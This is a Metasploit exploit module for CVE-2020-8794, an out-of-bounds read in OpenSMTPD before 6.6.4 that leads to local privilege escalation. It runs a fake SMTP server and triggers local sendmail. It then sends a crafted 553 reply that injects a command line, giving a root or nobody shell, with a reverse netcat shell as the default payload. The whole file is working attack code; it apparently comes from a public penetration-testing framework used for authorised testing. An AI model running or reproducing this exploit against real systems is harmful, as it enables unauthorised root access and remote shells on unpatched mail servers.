# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local

  # smtpd(8) may crash on a malformed message
  Rank = AverageRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Expect

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OpenSMTPD OOB Read Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an out-of-bounds read of an attacker-controlled
        string in OpenSMTPD&#039;s MTA implementation to execute a command as the
        root or nobody user, depending on the kind of grammar OpenSMTPD uses.
      },
      &#039;Author&#039;         => [
        &#039;Qualys&#039;, # Discovery and PoC
        &#039;wvu&#039;     # Module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2020-8794&#039;],
        [&#039;URL&#039;, &#039;https://seclists.org/oss-sec/2020/q1/96&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2020-02-24&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => true, # NOTE: Only when exploiting new grammar
      # Patched in 6.6.4: https://www.opensmtpd.org/security.html
      # New grammar introduced in 6.4.0: https://github.com/openbsd/src/commit/e396a728fd79383b972631720cddc8e987806546
      &#039;Targets&#039;        => [
        [&#039;OpenSMTPD < 6.6.4 (automatic grammar selection)&#039;,
          patched_version:     Gem::Version.new(&#039;6.6.4&#039;),
          new_grammar_version: Gem::Version.new(&#039;6.4.0&#039;)
        ]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {
        &#039;SRVPORT&#039;      => 25,
        &#039;PAYLOAD&#039;      => &#039;cmd/unix/reverse_netcat&#039;,
        &#039;WfsDelay&#039;     => 60 # May take a little while for mail to process
      },
      &#039;Notes&#039;          => {
        &#039;Stability&#039;    => [CRASH_SERVICE_DOWN],
        &#039;Reliability&#039;  => [REPEATABLE_SESSION],
        &#039;SideEffects&#039;  => [IOC_IN_LOGS]
      }
    ))

    register_advanced_options([
      OptFloat.new(&#039;ExpectTimeout&#039;, [true, &#039;Timeout for Expect&#039;, 3.5])
    ])

    # HACK: We need to run check in order to determine a grammar to use
    options.remove_option(&#039;AutoCheck&#039;)
  end

  def srvhost_addr
    Rex::Socket.source_address(session.session_host)
  end

  def rcpt_to
    "#{rand_text_alpha_lower(8..42)}@[#{srvhost_addr}]"
  end

  def check
    smtpd_help = cmd_exec(&#039;smtpd -h&#039;)

    if smtpd_help.empty?
      return CheckCode::Unknown(&#039;smtpd(8) help could not be displayed&#039;)
    end

    version = smtpd_help.scan(/^version: OpenSMTPD ([\d.p]+)$/).flatten.first

    unless version
      return CheckCode::Unknown(&#039;OpenSMTPD version could not be found&#039;)
    end

    version = Gem::Version.new(version)

    if version < target[:patched_version]
      if version >= target[:new_grammar_version]
        vprint_status("OpenSMTPD #{version} is using new grammar")
        @grammar = :new
      else
        vprint_status("OpenSMTPD #{version} is using old grammar")
        @grammar = :old
      end

      return CheckCode::Appears(
        "OpenSMTPD #{version} appears vulnerable to CVE-2020-8794"
      )
    end

    CheckCode::Safe("OpenSMTPD #{version} is NOT vulnerable to CVE-2020-8794")
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    start_service

    sendmail = "/usr/sbin/sendmail &#039;#{rcpt_to}&#039; < /dev/null && echo true"

    print_status("Executing local sendmail(8) command: #{sendmail}")
    if cmd_exec(sendmail) != &#039;true&#039;
      fail_with(Failure::Unknown, &#039;Could not send mail. Is OpenSMTPD running?&#039;)
    end
  end

  def on_client_connect(client)
    print_status("Client #{client.peerhost}:#{client.peerport} connected")

    # Brilliant work, Qualys!
    case @grammar
    when :new
      print_status(&#039;Exploiting new OpenSMTPD grammar for a root shell&#039;)

      yeet = <<~EOF
        553-
        553

        dispatcher: local_mail
        type: mda
        mda-user: root
        mda-exec: #{payload.encoded}; exit 0\x00
      EOF
    when :old
      print_status(&#039;Exploiting old OpenSMTPD grammar for a nobody shell&#039;)

      yeet = <<~EOF
        553-
        553

        type: mda
        mda-method: mda
        mda-usertable: <getpwnam>
        mda-user: nobody
        mda-buffer: #{payload.encoded}; exit 0\x00
      EOF
    else
      fail_with(Failure::BadConfig, &#039;Could not determine OpenSMTPD grammar&#039;)
    end

    sploit = {
      &#039;220&#039; => /EHLO /,
      &#039;250&#039; => /MAIL FROM:<[^>]/,
      yeet  => nil
    }

    print_status(&#039;Faking SMTP server and sending exploit&#039;)
    sploit.each do |line, pattern|
      send_expect(
        line,
        pattern,
        sock:    client,
        newline: "\r\n",
        timeout: datastore[&#039;ExpectTimeout&#039;]
      )
    end
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  ensure
    print_status("Disconnecting client #{client.peerhost}:#{client.peerport}")
    client.close
  end

  def on_client_close(client)
    print_status("Client #{client.peerhost}:#{client.peerport} disconnected")
  end

end

